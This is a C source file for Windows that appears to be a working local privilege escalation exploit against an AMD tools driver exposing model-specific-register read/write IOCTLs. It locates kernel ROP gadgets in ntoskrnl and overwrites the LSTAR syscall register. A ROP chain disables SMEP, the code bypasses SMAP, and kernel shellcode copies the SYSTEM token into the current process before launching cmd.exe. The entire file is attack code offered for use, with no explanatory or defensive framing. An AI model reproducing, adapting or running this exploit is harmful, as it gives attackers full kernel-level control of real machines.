#include <windows.h>
#include <setupapi.h>
#include <stdio.h>
#include <stdint.h>
#include <psapi.h>

#pragma comment(lib, "setupapi.lib")
#pragma comment(lib, "psapi.lib")

static const GUID GUID_AMDTOOLS = {
    0x1232175B, 0x1C34, 0x41FD,
    { 0xB1, 0x01, 0x34, 0x2D, 0x47, 0xB8, 0x28, 0xAC }
};

#define IOCTL_MSR_READ  0xfff02804
#define IOCTL_MSR_WRITE 0xfff02808
#define MSR_BUF_SIZE    0x14

#define KTHREAD_PROC    0x220
#define EPROCESS_PID    0x440
#define EPROCESS_LINKS  0x448
#define EPROCESS_TOKEN  0x4B8

#define CR4_NO_SMEP     0x250EF8

HANDLE OpenAmdTools(void) {
    HDEVINFO devInfo = SetupDiGetClassDevsW(&GUID_AMDTOOLS, NULL, NULL, DIGCF_DEVICEINTERFACE | DIGCF_PRESENT);
    if (devInfo == INVALID_HANDLE_VALUE) return INVALID_HANDLE_VALUE;
    SP_DEVICE_INTERFACE_DATA ifData = { .cbSize = sizeof(ifData) };
    if (!SetupDiEnumDeviceInterfaces(devInfo, NULL, &GUID_AMDTOOLS, 0, &ifData)) {
        SetupDiDestroyDeviceInfoList(devInfo);
        return INVALID_HANDLE_VALUE;
    }
    DWORD needed = 0;
    SetupDiGetDeviceInterfaceDetailW(devInfo, &ifData, NULL, 0, &needed, NULL);
    PSP_DEVICE_INTERFACE_DETAIL_DATA_W detail = malloc(needed);
    detail->cbSize = sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA_W);
    SetupDiGetDeviceInterfaceDetailW(devInfo, &ifData, detail, needed, NULL, NULL);
    HANDLE h = CreateFileW(detail->DevicePath, 0xC0000000, 0, NULL, 0x3, 0, NULL);
    free(detail);
    SetupDiDestroyDeviceInfoList(devInfo);
    return h;
}

int read_msr(HANDLE dev, uint32_t index, uint64_t *val) {
    uint8_t buf[20] = {0};
    *(uint32_t *)buf = index;
    DWORD br;
    if (!DeviceIoControl(dev, IOCTL_MSR_READ, buf, 20, buf, 20, &br, NULL))
        return 0;
    uint32_t lo = *(uint32_t *)(buf + 4);
    uint32_t hi = *(uint32_t *)(buf + 8);
    *val = ((uint64_t)hi << 32) | lo;
    return 1;
}

int write_msr(HANDLE dev, uint32_t index, uint64_t val) {
    uint8_t buf[20] = {0};
    *(uint32_t *)buf = index;
    *(uint32_t *)(buf + 4) = (uint32_t)val;
    *(uint32_t *)(buf + 8) = (uint32_t)(val >> 32);
    DWORD br;
    return DeviceIoControl(dev, IOCTL_MSR_WRITE, buf, 20, buf, 20, &br, NULL);
}

uint8_t *nt_image = NULL;
uint32_t nt_image_size = 0;
uint32_t text_rva = 0;
uint32_t text_size = 0;
uint32_t text_raw = 0;
uint64_t pop_rax_ret = 0;
uint64_t mov_cr4_rax_ret = 0;
uint32_t extra_slots = 0;
uint64_t nt_base = 0;

int load_ntoskrnl() {
    LPVOID drivers[512];
    DWORD needed;
    char path[MAX_PATH];
    char full_path[MAX_PATH];

    if (!EnumDeviceDrivers(drivers, sizeof(drivers), &needed)) {
        printf("EnumDeviceDrivers error %lu\n", GetLastError());
        return 0;
    }

    nt_base = (uint64_t)drivers[0];
    printf("ntoskrnl base: 0x%016llX\n", nt_base);

    GetDeviceDriverFileNameA(drivers[0], path, sizeof(path));
    if (strstr(path, "\\SystemRoot\\"))
        snprintf(full_path, sizeof(full_path), "C:\\Windows\\%s", path + 12);
    else
        strncpy(full_path, path, sizeof(full_path));

    printf("fullpath %s\n", full_path);

    HANDLE hFile = CreateFileA(full_path, 0x80000000, FILE_SHARE_READ, NULL, 0x3, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        snprintf(full_path, sizeof(full_path), "C:\\Windows\\System32\\ntoskrnl.exe");
        hFile = CreateFileA(full_path, 0x80000000, FILE_SHARE_READ, NULL, 0x3, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return 0;
    }

    nt_image_size = GetFileSize(hFile, NULL);
    nt_image = (uint8_t *)VirtualAlloc(NULL, nt_image_size, MEM_COMMIT, PAGE_READWRITE);
    DWORD bytesRead;
    ReadFile(hFile, nt_image, nt_image_size, &bytesRead, NULL);
    CloseHandle(hFile);

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)nt_image;
    IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64 *)(nt_image + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);

    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (!memcmp(sec[i].Name, ".text", 5)) {
            text_rva = sec[i].VirtualAddress;
            text_size = sec[i].Misc.VirtualSize;
            text_raw = sec[i].PointerToRawData;
            return 1;
        }
    }
    return 0;
}

int find_gadgets() {
    uint8_t *text = nt_image + text_raw;

    for (uint32_t i = 0; i < text_size - 2; i++) {
        if (text[i] == 0x58 && text[i + 1] == 0xC3) {
            pop_rax_ret = nt_base + text_rva + i;
            printf("pop rax; ret @ 0x%016llX\n", pop_rax_ret);
            break;
        }
    }

    for (uint32_t i = 0; i < text_size - 4; i++) {
        if (text[i] == 0x0F && text[i + 1] == 0x22 && text[i + 2] == 0xE0 && text[i + 3] == 0xC3) {
            mov_cr4_rax_ret = nt_base + text_rva + i;
            extra_slots = 0;
            printf("mov cr4, rax; ret @ 0x%016llX\n", mov_cr4_rax_ret);
            break;
        }
    }

    if (!mov_cr4_rax_ret) {
        for (uint32_t i = 0; i < text_size - 16; i++) {
            if (text[i] != 0x0F || text[i + 1] != 0x22 || text[i + 2] != 0xE0)
                continue;
            uint32_t pos = i + 3;
            uint32_t stack_adj = 0;
            int valid = 1;
            int has_pop_rsp = 0;
            while (pos < i + 16 && valid) {
                if (text[pos] == 0xC3) {
                    if (stack_adj > 0 && !has_pop_rsp) {
                        mov_cr4_rax_ret = nt_base + text_rva + i;
                        extra_slots = stack_adj / 8;
                        printf("mov cr4, rax; <epiloglar>; ret @ 0x%016llX (%u extra slots)\n", mov_cr4_rax_ret, extra_slots);
                        printf("\n");
                        goto found;
                    }
                    break;
                } else if (text[pos] == 0x5C) {
                    has_pop_rsp = 1;
                    break;
                } else if (text[pos] >= 0x58 && text[pos] <= 0x5F) {
                    stack_adj += 8; pos += 1;
                } else if (text[pos] == 0x41 && text[pos + 1] >= 0x58 && text[pos + 1] <= 0x5F) {
                    stack_adj += 8; pos += 2;
                } else if (text[pos] == 0x48 && text[pos + 1] == 0x83 && text[pos + 2] == 0xC4) {
                    stack_adj += text[pos + 3]; pos += 4;
                } else if (text[pos] == 0x90) {
                    pos += 1;
                } else {
                    valid = 0;
                }
            }
        }
    }
found:

    if (pop_rax_ret && mov_cr4_rax_ret)
        return 1;

    printf("tapilmadi e abi\n");
    return 0;
}

uint8_t shellcode[] = {
    0x0F, 0x01, 0xF8,                                            // swapgs
    0x49, 0x89, 0xC8,                                            // mov r8, rcx
    0x4D, 0x89, 0xD9,                                            // mov r9, r11
    0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00,        // mov rax, gs:[0x188]
    0x48, 0x8B, 0x80, 0x20, 0x02, 0x00, 0x00,                    // mov rax, [rax+0x220]
    0x48, 0x89, 0xC3,                                            // mov rbx, rax
    0x48, 0x8B, 0x80, 0x48, 0x04, 0x00, 0x00,                    // mov rax, [rax+0x448]
    0x48, 0x2D, 0x48, 0x04, 0x00, 0x00,                          // sub rax, 0x448
    0x83, 0xB8, 0x40, 0x04, 0x00, 0x00, 0x04,                    // cmp dword [rax+0x440], 4
    0x74, 0x09,                                                  // je found
    0x48, 0x8B, 0x80, 0x48, 0x04, 0x00, 0x00,                    // mov rax, [rax+0x448]
    0xEB, 0xE8,                                                  // jmp loop
    0x48, 0x8B, 0x90, 0xB8, 0x04, 0x00, 0x00,                    // mov rdx, [rax+0x4B8]
    0x48, 0x89, 0x93, 0xB8, 0x04, 0x00, 0x00,                    // mov [rbx+0x4B8], rdx
    0xB9, 0x82, 0x00, 0x00, 0xC0,                                // mov ecx, 0xC0000082
    0xB8, 0x00, 0x00, 0x00, 0x00,                                // mov eax, LSTAR_LO  (patched)
    0xBA, 0x00, 0x00, 0x00, 0x00,                                // mov edx, LSTAR_HI  (patched)
    0x0F, 0x30,                                                  // wrmsr
    0x4C, 0x89, 0xC1,                                            // mov rcx, r8  (return RIP)
    0x4D, 0x89, 0xCB,                                            // mov r11, r9  (return RFLAGS)
    0x0F, 0x01, 0xF8,                                            // swapgs
    0x48, 0x0F, 0x07                                             // sysretq
};

#define LSTAR_LO_OFFSET  79
#define LSTAR_HI_OFFSET  84

void patch_shellcode(HANDLE dev) {
    uint64_t orig_lstar;
    read_msr(dev, 0xC0000082, &orig_lstar);
    *(uint32_t *)&shellcode[LSTAR_LO_OFFSET] = (uint32_t)(orig_lstar);
    *(uint32_t *)&shellcode[LSTAR_HI_OFFSET] = (uint32_t)(orig_lstar >> 32);
    printf("lstarmsr patched: 0x%016llX\n", orig_lstar);
}

uint8_t trigger_code[] = {
    0x41, 0x57,                                                   // push r15
    0x41, 0x56,                                                   // push r14
    0x9C,                                                         // pushfq
    0x48, 0x81, 0x0C, 0x24, 0x00, 0x00, 0x04, 0x00,               // or [rsp], 0x40000  (set AC for SMAP bypass)
    0x9D,                                                         // popfq
    0x49, 0x89, 0xCF,                                             // mov r15, rcx  (saved_rsp ptr)
    0x49, 0x89, 0xD6,                                             // mov r14, rdx  (rop_chain ptr)
    0x49, 0x89, 0x27,                                             // mov [r15], rsp (save RSP)
    0x4C, 0x89, 0xF4,                                             // mov rsp, r14  (RSP = rop_chain)
    0x0F, 0x05,                                                   // syscall
    0x49, 0x8B, 0x27,                                             // mov rsp, [r15] (restore RSP)
    0x9C,                                                         // pushfq
    0x48, 0x81, 0x24, 0x24, 0xFF, 0xFF, 0xFB, 0xFF,               // and [rsp], ~0x40000 (clear AC)
    0x9D,                                                         // popfq
    0x41, 0x5E,                                                   // pop r14
    0x41, 0x5F,                                                   // pop r15
    0xC3                                                          // ret
};

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    SetThreadAffinityMask(GetCurrentThread(), 1);
    HANDLE dev = OpenAmdTools();
    if (dev == INVALID_HANDLE_VALUE) {
        printf("cannot open device\n");
        return 1;
    }
    printf("device open\n"); fflush(stdout);

    if (!load_ntoskrnl()) {
        printf("cannot load ntoskrnl\n");
        return 1;
    }
    fflush(stdout);

    if (!find_gadgets()) {
        printf("gadgets not found\n");
        return 1;
    }
    fflush(stdout);

    patch_shellcode(dev);
    fflush(stdout);

    void *mem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(mem, shellcode, sizeof(shellcode));

    uint64_t *rop_chain = (uint64_t *)VirtualAlloc(NULL, 4096, MEM_COMMIT, PAGE_READWRITE);
    memset(rop_chain, 0, 4096);
    rop_chain[0] = CR4_NO_SMEP;
    rop_chain[1] = mov_cr4_rax_ret;
    for (uint32_t s = 0; s < extra_slots; s++)
        rop_chain[2 + s] = 0;
    rop_chain[2 + extra_slots] = (uint64_t)mem;

    printf("rop[0] cr4 0x%llX\n", rop_chain[0]);
    printf("rop[1] mov cr4 0x%016llX\n", rop_chain[1]);
    printf("rop[%u] shellcode 0x%p\n", 2 + extra_slots, mem);
    printf("lstar -> pop rax; ret 0x%016llX\n", pop_rax_ret);
    fflush(stdout);

    void *trigger_mem = VirtualAlloc(NULL, sizeof(trigger_code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(trigger_mem, trigger_code, sizeof(trigger_code));
    typedef void (*trigger_fn)(uint64_t *, uint64_t *);
    trigger_fn trigger = (trigger_fn)trigger_mem;

    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

    if (!write_msr(dev, 0xC0000082, pop_rax_ret)) {
        printf("LSTAR write failed\n");
        return 1;
    }

    uint64_t saved_rsp = 0;
    trigger(&saved_rsp, rop_chain);

    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);

    fflush(stdout);

    CloseHandle(dev);

    system("cmd.exe");

    return 0;
}
